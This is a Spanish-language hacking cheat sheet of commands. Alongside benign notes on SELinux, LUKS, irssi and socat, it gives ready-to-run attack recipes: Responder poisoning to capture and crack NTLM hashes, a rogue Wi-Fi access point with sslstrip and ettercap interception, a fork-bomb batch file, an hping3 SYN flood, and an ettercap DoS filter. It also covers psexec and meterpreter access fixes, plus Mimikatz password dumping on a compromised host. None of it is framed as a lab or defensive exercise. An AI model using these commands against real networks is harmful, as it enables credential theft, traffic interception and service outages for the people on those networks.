_____________________________________________________________________________________________________________________________

NMAP

#nmap -sS TARGET			/**TCP SYN Scan
#nmap -sT TARGET			/**TCP Connect Scan (connect system call)
#nmap -sU TARGET 			/**UDP Scan
#nmap -sU -data-length='valor' TARGET	/**Tamaño de PAYLOAD (valor) o 0 para deshabilitar PAYLOAD
#nmap -sY TARGET			/**SCTP INIT Scan. (Mayormente usado para SS7/SIGTRAN)
#nmap -sN TARGET			/**TCP Flag Header is 0
#nmap -sX TARGET			/**Set the FIN PUSH URG Flag
#nmap -sF TARGET			/**Set the TCP FIN bit
#nmap -sA TARGET			/**Set the TCP ACK bit (Mostly used to detect and map out firewalls ruleset)
#nmap -sW TARGET			/**TCP Window Scan (idem ACK, except that it exploits an implementation detail of
					/**certain systems to differentiate open and closed ports
#nmap -sM TARGET			/**Maimon Scan idem Xmas Scan, except that the probe is FIN/ACK
#nmap -sP TARGET			/**TCP SYN Ping (or ACK for unpriviliged users)
#nmap -PE TARGET			/**Send a ICMP type 8 echo request, and expects an ICMP type 0 echo reply
#nmap -PP TARGET			/**Send a ICMP type 13 timestamp request, expects a type 14 timestamp reply
#nmap -PM TARGET 			/**Send a ICMP type 17 address mask request, expects a type 18 add mask reply
#nmap --reason				/**the 'reason' cmdline option nos dice cual fue la razon de respuesta a un paquete
#nmap -PA TARGET			/**TCP ACK Ping
#nmap -PU TARGET			/**Sends UDP Packet.(If port closed >ICMP port unreachable)(if UDP open>no response)
#nmap -sP -PO1 TARGET (letra O)		/**IP Ping. IP Packet with the specified protocol numbers in the protocol field of the 						.../**IP header (1=ICMP) (2=IGMP) (4=IP)
#nmap -PN TARGET			/**Disable host discovery
#nmap -sL TARGET			/**List potential targets and their DNS names
#nmap -n -sL TARGET			/**List ip targets (-sL) disabling DNS lookups
#nmap -PR TARGET 			/**ARP Ping
#nmap --dns-servers LIST		/**Specify DNS Servers to nmap to use
#nmap --send-ip TARGET			/**Disable the default ARP ping for local ethernet networks
#nmap 









______________________________________________________________________________________________________________________________
+-+-+-+-+
|T|G|C|D|
+-+-+-+-+

'TCP Gender Changer es un método para hacer accesible un servidor de red interno basado en TCP / IP más allá de su firewall de protección.' 'Para reenviar puertos, como lo del servidor SOCKS, a través del firewall'






____                                 _           
|  _ \ ___  ___ _ __   ___  _ __   __| | ___ _ __ 
| |_) / _ \/ __| '_ \ / _ \| '_ \ / _` |/ _ \ '__|
|  _ <  __/\__ \ |_) | (_) | | | | (_| |  __/ |   
|_| \_\___||___/ .__/ \___/|_| |_|\__,_|\___|_|   
               |_|                             

Obtencion pasiva de credenciales. Responde a las peticiones mDN, NBT-NS y LLMNR dando su propia direccion IP (envenenamiento).
LLMNR:
- LLMNR supports IPv6.
- LLMNR is Multicast.
- LLMNR is used when DNS name resolution is unable to identify a host. If LLMNR fail, NBT-NS will be used as last resort if enabled.
NBT-NS poisoner will respond to broadcast NBT-NS queries.
Cuando iniciamos responder, se unira al grupo IGMP y escuchara en el puerto UDP 5355 multicast.
Ademas tambien se pondrá en escucha en los puertos TCP 139, 445, 1433, 80 and UDP port 137

Extra Tools: responder/tools

Usage:

Several options are available, those are :
- d : Target Domain name. This option is optional, by default WORKGROUP will be used.
- i : Our IP address. This option is mandatory, it is used to poison LLMNR and NBT-NS answers with our ip address.
- r : If set to 1, Responder will answer to NBT-NS Workstation/Redirect queries. By default this option is set to false.
- b : Use HTTP basic authentication, this is used to capture clear text password. By default this option is set to false (NTLM auth)
- s : Turn HTTP server On/Off. By default the HTTP is enabled.

#responder.py -i YourIP -A              → -A Analyze Mode, be a ninja; Port scanning is for losers.

#responder.py -i YourIP -rFv            → -r use workstation redirector for NBT-NS
       					→ -F force auth on wpad.dat files retrieval (highly efficient)
                                        → -v be verbose, print all queries.

#responder -I eth0 -i 192.168.1.10 -A   → Analizamos las consultas LLMNR NBT-NS y Browser requests sin envenenar ni obtener 
				          credenciales
					  'This new mode offers a number of advantages for penetration testers looking to maximize 
					  stealth and perform reconnaissance. Passively discovered systems can be selectively added 
					  to the target whitelist option within the Responder.conf configuration file'
					
#responder -I eth0                      → Ponemos a trabajar a responder
En caso de Hashes capturados, ver carpeta /responder/logs, por ej. HTTP-NTLMv2-192.9.200.174.txt
#john HTTP-NTLMv2-192.9.200.174.txt     → destripamos con John

#responder -d SMB -i 192.9.200.MyIP -b 0 -s On -r 1 
→ → → → → -d Nombre de Dominio
	  -s Habilita el servidor HTTP
	  -r Seteado a 1 'responder' reponderá a las NBT-NS Workstation/Redirect queries
	  -b HTTP authentication

Scenario: 
Attacker 192.168.2.10 DNS-Server 192.168.3.58 Victim 192.168.2.39 GW 192.168.2.1
Desactivamos los ICMP requests salientes:
#iptables -A OUTPUT -p ICMP -j DROP
#Icmp-Redirect.py -i 192.168.2.10 -g 192.168.2.1 -t 192.168.2.39 -r 192.168.3.58
Ahora debería haber cambiado la ruta de la victima hacia el servidor DNS, deberíamos ser nosotros su nuevo RogueServerDNS
Ahora podemos crear una regla de Firewall con iptables para responder todos las consultas DNS por parte de la victima 192.168.2.39 hacia 192.168.3.58
#iptables -t nat-A PREROUTING -p udp --dst 192.168.3.58 --dport 53 -j DNAT--to-destination 192.168.2.10:53
Fromthere, Responder will reply to DNS requests and make use of its rogueauthentication servers.

#FindSQLSrv.py            → Map MSSQL servers on your subnet, one packet.

#DHCP.py -I eth0 -i 10.20.30.40 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1
→ -i nuestra IP
→ -d Domain to inject
→ -p Primary Domain to inject
→ -s Secondary Domain to inject
→ -r Gateway/Router to inject


REF:
https://www.trustwave.com/Resources/SpiderLabs-Blog/Introducing-Responder-1-0/
https://www.trustwave.com/Resources/SpiderLabs-Blog/Owning-Windows-Networks-with-Responder-1-7/
https://www.trustwave.com/Resources/SpiderLabs-Blog/Owning-Windows-Networks-With-Responder-Part-2/
https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/

  ____ ____  _   _ _   _  ____ _   _ 
 / ___|  _ \| | | | \ | |/ ___| | | |
| |   | |_) | | | |  \| | |   | |_| |
| |___|  _ <| |_| | |\  | |___|  _  |
 \____|_| \_\\___/|_| \_|\____|_| |_|
                                     
En el archivo charset.lst podemos ver todos los charsets disponibles: Por Ej. 'numeric'

#crunch <min> <max> 
#crunch -o diccionario.txt             			    → Con la opcion -o (output) especificamos un nombre archivo de salida
#crunch 4 4                                                 → Genera todas las combinaciones de 4 letras posibles segun su charset 
                                                              setting por Default utiliza lalphet (Low Alphabet) letras minusculas 
#crunch 4 4 -f /directorio_de/charset.lst numeric           → Genera todas las comb posibles de 4 digitos entre numeros del 0-9
#crunch 4 4 ab12                                            → Genera comb posibles de 4, con los caracteres especificados
#crunch 9 9 under@@@@@@                                     → Genera todas las combin. posibles de letras sobre los caracteres '@'  
                                                              dejando fijos en su lugar los especificados por nosotros 'under'
#crunch 9 9 -f .charset.lst lalpha-numeric -t und@@@@@@     → Genera combin. de letras(minusc.) y numeros sobre los '@' 
#crunch 9 9 abcefghijklmnopqrstuwxyz1234567890 -t und@@@@@@ → Genera comb. sobre los '@' con los caracteres especificados

#crunch 9 9 -t ,nd@@@%@^				    → con la opcion '-t' definimos el tipo de caracter que queremos insertar   
							      @ inserta minusculas en las posiciones 3 4 5
							      , inserta mayusculas en la posicion 1
							      % inserta numeros en la posicion 6
							      ^ inserta simbolos en la posicion 8
							      
#crunch 1 1 -p Harry Hermione Ron                           → concatenamos y combinamos las 3 palabras 


#crunch 1 1 -o /crunch/START -c 5000                        → Cada 5000 lineas genera un fichero, usamos la opción -c (esta opción 
                                                              solo funciona si el -o START está presente en la linea)
							      -START funciona como nombre de archivo para el primer fichero a crear, 
							      a partir de ahi los ficheros tomaran el nombre de la ultima linea del 
							      archivo anterior + la primera linea del archivo posterior

#crunch 1 1  -o /crunch/START -c 5000 -z gzip		    → Los ficheros generados son automaticamente comprimidos en gzip
							      crunch soporta (gzip, bzip2, lzma, and 7z)


#crunch 8 8 | aircrack-ng -e [ESSID] -w – [file path to the .cap file]                 → Piping Crunch con Aircrack
#crunch 8 8 | aircrack-ng -e test -w - /pentest/wireless/aircrack-ng/test/wpa.cap      → Piping (otro ejemplo)




 _____ ___ ____  _____ _____ _____  __
|  ___|_ _|  _ \| ____|  ___/ _ \ \/ /
| |_   | || |_) |  _| | |_ | | | \  / 
|  _|  | ||  _ <| |___|  _|| |_| /  \ 
|_|   |___|_| \_\_____|_|   \___/_/\_\
                                      

network.http.keep-alive.timeout  -->  300
network.http.pipelining  --> TRUE
network.http.pipelining.maxrequests  --> 8
network.http.max-persistent-connections-per-proxy  --> 16
network.http.proxy.pipelining --> TRUE
network.http.pipelining.ssl   --> TRUE 
network.proxy.socks_remote_dns  --> TRUE

Fuente: https://thehackerway.com/2011/11/11/preservando-el-anonimato-y-extendiendo-su-uso-%e2%80%93-mejorando-el-anonimato-navegando-con-firefox-%e2%80%93-parte-xv/



<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

TORTUNNEL


-LINKS
https://github.com/manurautela/tortunnel.git
https://github.com/moxie0/tortunnel.git

#cd tortunnel...
#autoreconf
#automake --add-missing
#./configure
#make
#make install

Dependencias necesarias:
apt-get install libboost-all-dev
apt-get install libboost*
apt-get install automake
apt-get install g++
apt-get install gcc
apt-get install libssl-dev

Posibles Errores:

Error 1)
perl: warning: Falling back to the standard locale ("C").
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = "es_AR:es",
        LC_ALL = (unset),
        LANG = "es_AR.UTF-8"
    are supported and installed on your system.

Solucion 1)
Configurar locales
#locale-gen es_ES.UTF-8
#dpkg-reconfigure locales



<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>	

FakeAP

- install dhcpd
- nano /etc/dhcpd.conf
                    authoritative;
                    default-lease-time 600;
                    max-lease-time 7200;
                    subnet 192.168.1.0 netmask 255.255.255.0 {
                    option routers 192.168.1.1;
                    option subnet-mask 255.255.255.0;
                    option domain-name "WifiLibre";
                    option domain-name-servers 192.168.1.1;
                    range 192.168.1.2 192.168.1.40;
                    }

- airmon-ng start wlan0
- airbase-ng -c 11 -e WifiLibre wlan0mon
- root@Jamon:~# ifconfig at0 192.168.1.1 netmask 255.255.255.0
- root@Jamon:~# ifconfig at0 mtu 1500
- root@Jamon:~# route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
- root@Jamon:~# echo 1 > /proc/sys//net/ipv4/ip_forward
- root@Jamon:~# iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
- root@Jamon:~# iptables -P FORWARD ACCEPT
- root@Jamon:~# iptables --append FORWARD --in-interface at0 -j ACCEPT
- root@Jamon:~# iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
- root@Jamon:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
- root@Jamon:~# dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
                Internet Systems Consortium DHCP Server 4.3.1
                Copyright 2004-2014 Internet Systems Consortium.
                All rights reserved.
                For info, please visit https://www.isc.org/software/dhcp/
                Config file: /etc/dhcpd.conf
                Database file: /var/lib/dhcp/dhcpd.leases
                PID file: /var/run/dhcpd.pid
                Wrote 1 leases to leases file.
                Listening on LPF/at0/00:1a:ef:06:bb:47/192.168.1.0/24
                Sending on   LPF/at0/00:1a:ef:06:bb:47/192.168.1.0/24
                Sending on   Socket/fallback/fallback-net
- root@Jamon:~# /etc/init.d/isc-dhcp-server start
                [ ok ] Starting isc-dhcp-server (via systemctl): isc-dhcp-server.service.
- sslstrip -f -p -k 10000
- ettercap -p -u -T -q -i at0
- 



Posibles Errores: 
-Can't open lease database /var/lib/dhcp/dhcpd.leases: No such file or directory --
-Solucion: # #touch /var/lib/dhcp/dhcpd.leases


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



mitmf

"MITMf on the kali repos is deprecated. Use the instructions on the wiki (https://github.com/byt3bl33d3r/MITMf/wiki/Installation) to get the latest version."

# Archlinux
$ sudo pacman -S python-virtualenvwrapper
# Fedora
$ sudo dnf install python-virtualenvwrapper
# Debian, Ubuntu
$ sudo apt-get install virtualenvwrapper
O se puede usar pip:
# Linux, OS X
$ sudo pip install virtualenvwrapper
# Archlinux
# (si pip ha sido instalado usando el gestor de paquetes)
$ sudo pip2 install virtualenvwrapper

agregar un par de variables de entorno al archivo ~/.bashrc ó ~/.bash_profile:
#export WORKON_HOME=/opt/virtualenvs
#export VIRTUALENVWRAPPER_HOOK_DIR=$WORKON_HOME/hooks

La variable WORKON_HOME determina en que directorio se deben crear los virtualenvs al ejecutar el comando mkvirtualenv.

La segunda variable, VIRTUALENVWRAPPER_HOOK_DIR, establece el directorio en donde se instalaran algunos scripts muy útiles que pueden ser usados para automatizar ciertas tareas, como por ejemplo hacer un commit a un repositorio justo antes de desactivar el virtualenv.

Por último, se debe agregar una línea al archivo ~/.bashrc ó ~/.bash_profile para especificar en dónde esta ubicado el ejecutable de virtualenvwrapper:

source /usr/bin/virtualenvwrapper.sh

Si se ha instalado virtualenvwrapper en Debian usando el gestor de paquetes, es probable que la línea de arriba no funcione. Intente la siguiente:

source /etc/bash_completion.d/virtualenvwrapper

Si las dos líneas anteriores han fallado, es posible que el archivo virtualenvwrapper.sh se encuentre ubicado en el directorio /usr/local/bin/:

source /usr/local/bin/virtualenvwrapper.sh

Lo que hace este último comando es procesar el código contenido en el script virtualenvwrapper.sh dentro del shell o terminal que estamos utilizando para que los comandos mkvirtualenv, rmvirtualenv y workon estén disponibles.

    Create your virtualenv:

mkvirtualenv MITMf -p /usr/bin/python2.7

    Clone the MITMf repository:

git clone https://github.com/byt3bl33d3r/MITMf

    cd into the directory, initialize and clone the repos submodules:

cd MITMf && git submodule init && git submodule update --recursive

    Install the dependencies:

pip install -r requirements.txt

    You're ready to rock!

python mitmf.py --help



Comun Errors:

Dns port in use -->>>>>  Modificar el puerto DNS en el archivo /etc/mitmf/mitmf.conf




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<DoS Basico<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_________________________________________________Win BAT

:a
start
goto a

#save como x.bat and run it

_________________________________________________hping3 DoS

# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 192.168.1.24




___________________________________________ettercap DoS basico

script:

if (ip.src == 'Target IP' || ip.dst == 'Target IP')
{
drop();
kill();
msg("Packet Dropped\n");
}
	
Save as dos.elt

#etterfilter dos.elt -o dos.ef
#ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /192.168.1.209/ //    
**Ojo con los Slash finales Error: Incorrect number of token.....

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

selinux

instalacion
>apt install selinux-basics selinux-policy-default

_________________________
>semodule -i /usr/share/selinux/default/abrt.pp.bz2     'habilita el modulo abrt.pp.bz2' pp.bz2 (policypackage.bz2)
>semodule -r 'modulo'            → Elimina un modulo de la configuracion actual
>semodule -l                     → Lista los modulos instalados
>sestatus                        → Muestra el estado actual de Selinux
>semodule -e 'modulo'            → Activa un modulo selectivamente
>semodule -d 'modulo'            → Desactiva un modulo selectivamente
>semanage                        → si no está instalado en RHEL7/CENTOS7 'yum install policycoreutils-python'
>semanage login -l               → Enumera las correspondencias actuales entre identificadores...
                                 → ...de usuario e identidades Selinux
>semanage login -a -s user_u juanperez     → Asocia la identidad user_u con el usuario juanperez
>semanage login -d juanperez     → elimina la asociacion asignada al usuario
>semanage user -l                → enumera las asociaciones entre las entidades Selinux y los roles permitidos


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

luks  (skywalker  ;););););))

basico:

# lsblk
# dd if=/dev/urandom |pv| dd of=/dev/sdax          **rellenamos con datos aleatorios
# umount /dev/sdX
# cryptsetup --verbose --verify-passphrase luksFormat /dev/sdax 
# cryptsetup luksOpen /dev/sdaX superGelatina
Lo anterior crea un nuevo dispositivo denominado /dev/mapper/superGelatina
# fdisk -l
# mkfs.ext4 /dev/mapper/superGelatina              **lo formateamos para que el sistema pueda usarlo
Editamos el /etc/crypttab si queremos que nos pida la contraseña de la particion al inicio del sistema
Ejemplo: superGelatina UUID:d67286c6-6531-4c82-917b-5a59a8c0c7ad none
# nano /etc/crypttab                     (Ayuda:  cryptsetup luksDump /dev/sdaX)
Editamos fstab:

Añada lo siguiente o bien se reemplaza el nombre del dispositivo anterior (UUID=xxxxxxxxxxxx, /dev/sdaX o LABEL=/datos, dependiendo de la versión del sistema operativo) —como /dev/mapper/datos— para que el sistema operativo utilice automáticamente el dispositivo con el siguiente reinicio:

/dev/mapper/superGelatina   /superGelatina   ext4   defaults,noatime,nodiratime   1 2
# nano /etc/fstab
# cryptsetup luksClose /dev/mapper/superGelatina            **desconectamos el dispositivo


______________________________________________backup de header:_________________________________________________________

Analizamos nuestro dispositivo luks
# cryptsetup luksDump /dev/sdx2
backup'eamos' los headers
# cryptsetup luksHeaderBackup /dev/sdx1 --header-backup-file portatil-header.bak
Cada header es de aprox 1MiB, así que multiplicamos 1MiB por el nro de headers que tengamos y le damos un extra de 2 claves+:
despues chequeamos con isLuks si el dispositivo es Luks, rellenamos con /dev/zero para destruir nuestras headers y volvemos 
a chequear con isLuks para cerciorarnos de que ya no tenemos acceso al dispositivo encriptado (tks elbinario)
# cryptsetup -v isLuks /dev/sdx1
# head -c 3145728 /dev/zero > /dev/sdx1
# cryptsetup -v isLuks /dev/sdx1
restauramos los headers:
# cryptsetup luksHeaderRestore /dev/sdx1 --header-backup-file portatil-header.bak
# cryptsetup -v isLuks /dev/sdx1
tip: para evitar borrar como un nabo los headers, les cambiamos los atributos:
# chattr +i clave.luks


_____________________________________________________________________________________________________________________________

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



irssi                   

/set nick <nick>                                      **set the nick
/set real_name <name>                                 **set real_name
/set user_name                                        **Modifica el user_name, OJO vacio usa el nombre de usuario de sistema
/connect -ssl OnionIRC 6697                           **Si queremos usar conexion segura
/network add OnionIRC                                 **Una vez dentro añadimos la red a la configuracion
/server add -network OnionIRC -ssl onionirchubx 6697  **anñadimos el servidor de OnionIRC, con SSL y el puerto 6697
/network add -autosendcmd "/msg <nick> identify <pass>; wait 2000" OnionIRC      **Si tenemos el Nick registrado
/channel add -auto #OpAfrica OnionIRC                 **añadimos el canal #Opafrica
/save                                                 **guardamos los cambios
/exit                                                 **salimos
/connect OnionIRC                                     **una vez que tenemos configurado lo anterior nos conectamos mas facil
/network list & /server list                          **to ver all the configured networks and servers
alt+#   where # is 0 a 9                              **SWITCHING WINDOWS
alt ← alt → 					      **SWITCHING WINDOWS
alt 1                                                 **SWITCH TO STATUS BAR
/list                                                 **Lista los canales del IRC
/rmreconns                                            **Stop irssi trying connections
/q <para_nick>                                        **PRIVATE MSG 'q' is short for 'query'
/msg <nick> bla bla bla                               **mensaje para <nick>
/msg <nick1>,<nick2> bla bla bla                      **mensaje para varios
/invite <nick> #politics                              **invita a <john> al canal #politics
/help <command>                                       **ayuda sobre un comando puntual
/set                                                  **SEE SEETINGS → use PageUp/Down
/set timestamp_format %H:%M:%S                        **SET TIME
/save                                                 **SAVE THE SET
/script exec $ENV{'TZ'}='UTC';                        **SET UTC TIME
/ban 	/bans, /b 	                              **Sets or List bans for a channel
/clear 	/c, /cl 	                              **Clears a channel buffer
/join 	/j 	                                      **Joins a channel
/kick 	/k 	                                      **Kicks a user
/kickban 	/kb 	                              **Kickban a user
/msg 	/m 	                                      **Send a private message to a user
/unban* 	/mub 	                              **Clears the unbanlist (unbans everyone) in a channel
/names 	/n 	                                      **Lists the users in the current channel
/query 	/q 	                                      **Open a query window with a user, or close current query window
/topic 	/t 	                                      *1*Displays/edits current topic. Tip: use /t[space][tab] to                                                                  *2*automatically fill in existing topic.
/window close 	/wc 	                              **Force closure of a window.
/whois 	/wi 	                                      **WHOIS a user. Displays user information
/run <scriptname>	                              *1*Run <scriptname> Ejecuta un script	
                                                      *2*Perl scripts for irssi (scripts.irssi.org)
                                                      *3*Download the scripts to the carpeta ~/.irssi/scripts

Anti_Leakage:

ignores = ( { level = "CTCPS"; } );                   *1*To minimize information leakage from irssi add                                                                            *2*to irssi config (if irssi isn't running!)
/ignore * CTCPS                                       **or type (if irssi is running!) in your status window
/save

 If you run irssi without user_name and nick set to the empty string, irssi will automatically rewrite the config file to contain your user name, then it will continue to run. This may leak your username to any servers and rooms to which irssi automatically connects:

______________________________________________irssi Anti_leakage_________________________________________________________
If you run irssi without user_name and nick set to the empty string, irssi will automatically rewrite the config file to contain your user name, then it will continue to run. This may leak your username to any servers and rooms to which irssi automatically connects:       

$ whoami
example_user
$ cp ~/.irssi/config ./config_before_running_irssi 
$ torify irssi
 <quit irssi>
$ diff -u ./config_before_running_irssi ~/.irssi/config 
--- ./config_before_running_irssi       2012-02-13 20:36:03.057787378 -0800
+++ /home/example_user/.irssi/config    2012-02-13 20:36:42.630898407 -0800
@@ -259,8 +259,8 @@
 settings = {
   core = {
     real_name = "";
-    user_name = "";
-    nick = "";
+    user_name = "example_user";
+    nick = "example_user";
   };
   "fe-text" = { actlist_sort = "refnum"; };


from: https://trac.torproject.org/projects/tor/wiki/doc/TorifyHOWTO/irssi#PreventLeakageirssi

________________________________________________irssi Anti_leakage_____________________________________________________

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


______________________________________________________socat____________________________________________________________

Socat
Socat nos permite crear tuberías de datos (conexiones entre puertos, vpns, ejecución remota, etc.) entre máquinas remotas, usando la sintaxis a continuación:

Socat [opciones] tipo:valor tipo2:valor2
Creación de una tubería de datos de tipo tipo, hacia una tubería de datos de tipo tipo2.

Los tipos y valores que se pueden especificar son, entre otros, los siguientes:

 TUN Creación de un túnel IP
 EXEC Ejecución remota de un comando
 STDOUT Conectar con la salida estándar
 STDIN Conectar con la entrada estándar
 STDIO Permitir comunicación de entrada y salida
 TCP-LISTEN Escuchar en un puerto determinado (orientado a conexión)
 TCP_CONNECT Establecer una conexión con un puerto que está a la escucha (orientado a conexión)
 UDP_LISTEN Escuchar en un puerto determinado (NO orientado a conexión)
 UDP_CONNECT Establecer una conexión con un puerto que está a la escucha (NO orientado a conexión)
 … (muchos más)

Creación de un túnel ip con otra máquina remota (172.16.0.3), usando ssh-keygen para autenticación remota
#socat tun:10.0.0.1/8 exec:"ssh -i /root/.ssh/id_rsa root@172.16.0.3 'socat tun:10.0.0.2/8 stdio'" &

socat TCP4-LISTEN:6666, fork SOCKS4A:127.0.0.1:DireccionDeOnion:6697,socksport=9150

socat tcp-listen:9999,interface=lo,fork socks4a:localhost:<proxyhost>:<proxyport>,socksport=9150

Para entender un poco más lo que hacemos:
tcp-listen: 9999 <- el puerto de escucha en nuestra máquina
interface= lo <- el interface donde escucha nuestro puerto
socks4a:localhost: <- el host donde esta funcionando tor
socksport: 9150 <- el puerto de tor que estamos usando
<proxyhost> <- direccion del http proxy
<proxyport> <- puerto del http proxy

Por último sólo nos queda configurar en firefox: En Preferencias -> Avanzado -> Red -> Configuración -> Proxy: localhost: 9999 SOCKS4A o SOCKS5 con resolución DNS activada.

Con esto añadimos un salto más al salir por el nodo de salida de tor. Aunque no está cifrado podemos usar direcciones de servidores proxy que no esten en las blacklist de los proveedores, los cuales están bloqueando los nodos de salida tor ;-)

From: https://elbinario.net/2015/03/08/torificar-un-proxy-con-socat-un-salto-mas-al-infinito/

                                      *************************************************************
				      
Establecimiento de una puerto de escucha local y un forward hacia otro destino:

socat TCP4-LISTEN:3333 TCP4:www.google.com.ar:www → Con esto abrimos el puerto 3333 y redirigimos el trafico de este hacia google
socat TCP4:192.168.1.33:3333

																				      *************************************************************
																
1)																
Ejecucion de comandos de forma remota:												
Ejemplos:
a. socat - EXEC:'Hello World'		
b. socat – EXEC:’ssh -p 22 root@192.168.1.34′,pty,setsid,ctty 

2)
Obtener la hora desde un Servidor:
#socat TCP:time.nist.gov:13 -

3)
Conectar un puerto Serial a otro puerto Serial:
#socat /dev/ttyS0,raw,echo=0,crnl /dev/ttyS1,raw,echo=0,crnl

4)
Redirigir puerto http 80 a otro puerto http 80:
#socat TCP-LISTEN:80,fork TCP:www.domain.org:80

5)
Redirigir Terminal a un puerto Serial:
#socat READLINE,history=$HOME/.cmd_history /dev/ttyS0,raw,echo=0,crnl 

6)
Conversacion unidireccional entre 2 maquinas:
IP del Server '192.9.200.10'
Server Side #socat -u TCP-LISTEN:5000 STDOUT
Client Side #socat -u STDIN TCP:192.9.200.10:5000

7)
Conversacion bidireccional entre 2 maquinas:
Server Side #socat TCP-LISTEN:5000 STDIO
Client Side #socat TCP:192.9.200.10:5000 STDIO

8)
Enviar LOGs a un Server desde la lectura de un cliente:
En algun lugar remoto del Cliente estamos TCPDUMP'eando paquetes y guardandolos en el LOG /var/log/tcpdump/tcpdump.log y lo que capturamos lo leemos
en la pantalla del Server: IP del Server (192.9.200.77)

Server Side #socat -u TCP-LISTEN:5000 STDOUT
Client Side #socat -u OPEN:/var/log/tcpdump/tcpdump.log,rdonly=1,seek-end=0,ignoreeof TCP:192.9.200.77:5000

Nota: Se está abriendo el fichero (OPEN:/var/log/system.log), como sólo lectura (rdonly=1), posicionándose al final del mismo (seek-end=0) e ignorando el fin del fichero (ignoreof). Los datos que se leen se están mandando por TCP a localhost:5000.


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

TOR

- Anonimizar navegacion. Con Servicio de TOR corriendo apuntamos nuestra configuracion Network del navegador para que
  salga a traves de SOCKS: 127.0.0.1:9050
- Anonimizar aplicacion: Proxychains+(nmap-iceweasel-etc...)
- DNSRequest a través de TOr, editar /etc/tor/torrc al final DNSPort 53, despues editamos el /etc/resolv.conf --> nameserver 127.0.0.1
- 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


WIN7 


Habilitar cuenta administrad(t)or

c:>>net user administrador active/yes
C:>>net user administrador active/no
C:>>net user administrador *
c:>>escriba una contraseña para el usuario:  ;);););););););););)

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

 ____   _    ____ ____    _____ _   _ _____   _   _    _    ____  _   _ 
|  _ \ / \  / ___/ ___|  |_   _| | | | ____| | | | |  / \  / ___|| | | |
| |_) / _ \ \___ \___ \    | | | |_| |  _|   | |_| | / _ \ \___ \| |_| |
|  __/ ___ \ ___) |__) |   | | |  _  | |___  |  _  |/ ___ \ ___) |  _  |
|_| /_/   \_\____/____/    |_| |_| |_|_____| |_| |_/_/   \_\____/|_| |_|
                                                                        
"""""""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Set the options and then exploit......
>>meterpreter

Error: 
[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
Solucion:
“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” with “RequireSecuritySignature” set to “0”
Error:
[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)
Solucion: Concatenate the blank LM hash to the NTLM hash
00000000000000000000000000000000:




Dumping Hashes

""""""""""""""""""""""""""""""""""""""""""""""""""Mimikatz"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
>>mimikatz.exe
>>privilege::debug                             //nos da privilegios sobre LSA
>>sekurlsa::logonpasswords
...................muchos hashes y passwords...........

Se puede usar mimikatz como post/exploitation desde metasploit

Opcion 1)
Cargar mimikatz al sistema comprometido
>>meterpreter>> upload /home/mimikatz.exe c:\\AlgunLugarEscondido
>>meterpreter>> shell
C: > cd AlgunlLugarEscondido
c:\AlgunLugarEscondido > mimikatz.exe

